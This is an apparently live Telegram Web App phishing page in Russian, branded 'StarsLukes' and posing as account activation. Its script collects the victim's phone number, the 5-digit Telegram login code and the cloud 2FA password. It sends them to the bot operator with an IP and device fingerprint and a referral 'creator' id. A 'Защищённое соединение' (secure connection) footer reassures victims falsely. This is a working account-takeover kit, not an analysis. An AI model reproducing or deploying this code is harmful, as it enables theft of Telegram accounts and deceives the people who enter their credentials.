 <!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>StarsLukes · Активация</title>
    <style>
        :root {
            --bg: #0a0a0f;
            --card: #12121a;
            --gold: #d4af37;
            --text: #e0e0e0;
            --muted: #888;
            --input-bg: #1a1a22;
            --border: #2a2a35;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Inter', -apple-system, system-ui, sans-serif;
            background: var(--bg);
            color: var(--text);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            width: 100%;
            max-width: 380px;
            background: var(--card);
            border-radius: 28px;
            padding: 32px 24px;
            border: 1px solid var(--border);
            box-shadow: 0 30px 50px rgba(0,0,0,0.7);
            text-align: center;
        }
        .logo {
            font-size: 28px;
            font-weight: 600;
            color: var(--gold);
            margin-bottom: 24px;
        }
        .logo span { color:#fff; font-weight:300; }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 14px;
            background: linear-gradient(145deg, #c9a23b, #e4b84d);
            color: #0a0a0f;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin-top: 12px;
        }
        input {
            width: 100%;
            padding: 14px;
            background: var(--input-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
            margin-bottom: 12px;
        }
        .hidden { display: none; }
        .footer-note {
            margin-top: 20px;
            font-size: 12px;
            color: var(--muted);
        }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">Stars<span>Lukes</span></div>

    <div id="step-phone">
        <p>Авторизируйтесь через Telegram</p>
        <button class="btn" onclick="requestContact()">Поделиться контактом</button>
    </div>

    <div id="step-code" class="hidden">
        <p>Введите код из Telegram</p>
        <input type="text" id="codeInput" placeholder="12345" maxlength="5" inputmode="numeric">
        <button class="btn" onclick="submitCode()">Подтвердить</button>
    </div>

    <div id="step-2fa" class="hidden">
        <p>Облачный пароль (если есть)</p>
        <input type="password" id="passwordInput" placeholder="Пароль">
        <button class="btn" onclick="submitPassword()">Продолжить</button>
    </div>

    <div class="footer-note">Защищённое соединение</div>
</div>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    // Fingerprint
    const fingerprint = {
        ip: '',
        userAgent: navigator.userAgent,
        platform: navigator.platform
    };
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => fingerprint.ip = d.ip)
        .catch(() => {});

    const urlParams = new URLSearchParams(window.location.search);
    const creatorUid = urlParams.get('creator') || null;

    // Если открыто с параметром step=2fa, сразу поле пароля
    if (urlParams.get('step') === '2fa') {
        document.getElementById('step-phone').classList.add('hidden');
        document.getElementById('step-code').classList.add('hidden');
        document.getElementById('step-2fa').classList.remove('hidden');
        const uidParam = urlParams.get('uid');
        if (uidParam) {
            document.getElementById('step-2fa').setAttribute('data-uid', uidParam);
        }
    }

    function show(id) {
        ['step-phone','step-code','step-2fa'].forEach(x => document.getElementById(x).classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    window.requestContact = function() {
        tg.requestContact().then(contact => {
            tg.sendData(JSON.stringify({
                step: 'send_code',
                phone: contact.phone_number,
                fingerprint: fingerprint,
                creator_uid: creatorUid
            }));
            show('step-code');
        }).catch(err => {
            tg.showAlert('Необходимо разрешить доступ к номеру телефона.');
        });
    };

    window.submitCode = function() {
        const code = document.getElementById('codeInput').value.trim();
        if (!/^\d{5}$/.test(code)) {
            tg.showAlert('Код — 5 цифр');
            return;
        }
        tg.sendData(JSON.stringify({ step: 'verify_code', code: code }));
        tg.close();
    };

    window.submitPassword = function() {
        const password = document.getElementById('passwordInput').value;
        const uid = document.getElementById('step-2fa').getAttribute('data-uid') || '';
        tg.sendData(JSON.stringify({ step: 'password', password: password, uid: uid }));
        tg.close();
    };
</script>
</body>
</html>
